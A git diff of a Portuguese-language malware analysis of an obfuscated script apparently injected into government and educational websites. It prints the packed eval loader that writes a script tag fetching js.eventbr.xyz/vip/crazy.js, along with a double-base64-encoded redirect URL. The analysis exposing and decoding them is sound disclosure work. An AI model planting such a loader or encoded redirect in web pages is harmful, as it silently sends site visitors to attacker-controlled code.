@@ -40,16 +40,9 @@
 <h3>Comportamento Malicioso ou Suspeito</h3>
 <p>A obfuscação do código e suas ações suspeitas indicam comportamento malicioso.</p>
 
-<h2>Detalhes Adicionais</h2>
-
-<p>O código inclui uma requisição feita pelo Burp Suite, retornando um código 200 para um título "404".</p>
-<p>Um link no código aponta para um script em um domínio suspeito.</p>
-
 <h2>Exemplos de Código</h2>
 
 <h3>Integração de Rastreamento e Análise</h3>
-<pre>
-<code>
 <h1> BUSCA NO BURP SUITE DE ALGUNS ALVOS</h1>
 
 Claramente, consegui acha algumas formas que esses 167 sites governamentais e educacional sofreram esse ataque, porem não vou divulgar nesse documento, não vai ser apresentado as tecnicas. 
@@ -64,15 +57,30 @@ link acesso o codigo https://js.eventbr.xyz/vip/crazy.js
 
 vamos tentar obeter algumas informação para entender melhor
 alguns exemplos para onde estamos sendo direcionados. 
+<pre>
+<code>
+ 
+ O restante do codigo pode ser encontrado em codigoofuscado.js
+
+('m(d(p,a,c,k,e,r){e=d(c){f c.n(a)};h(!\'\'.i(/^/,o)){j(c--)r[e(c)]=k[c]||e(c);k=[d(e){f r[e]}];e=d(){f\'\\\\w+\'};c=1};j(c--)h(k[c])p=p.i(q s(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);f p}(\'1["2"]["3"](\\\'<0 4="5/6" 7="8://9.a/b.c"></0>\\\');\',l,l,\'t|u|v|x|y|z|A|B|C|D|E|F|G\'.H(\'|\'),0,{}))', 44, 44, '|||||||||||||function||return||if|replace|while||13|eval|toString|String||new||RegExp|script|window|document||write|type|text|javascript|src|https|js.eventbr|xyz|vip/crazy|js|split'.split('|'), 0, {}))
+</code>
+</pre>
+<p>Imagens</p>
+
+![Alt text](image/image3.png)
+
+
+<pre>
+<code>
+ O restante do codigo pode ser encontrado em js.eventbr.xyz_vip_crazy.js
 
 url_pc_jpx="YUhSMGNITTZMeTkzZDNjdWQycGlaWFF1WTJ4MVlpOXBibVJsZUQ5aFptWnBiR2xoZEdWRGIyUmxQWFpwY0RnNE9BPT0=";
 
+</code>
+</pre>
 Observe pela imagem que ele foi criptografado em base64, 2 vez para tentar ofuscar. 
 
 ![urls base64](image/image-1.png)
-
-</code>
-</pre>
 
 <h3>Manipulação de URLs e Redirecionamento</h3>
 <pre>
@@ -96,7 +104,6 @@ url_m_frmex = mydecx(mydecx(url_m_frmex));
 <p>Observe o endereço de ip</p>
 
 ![Alt text](image/requestIp.jpg)
-
 
 <h2>Conclusão</h2>
 
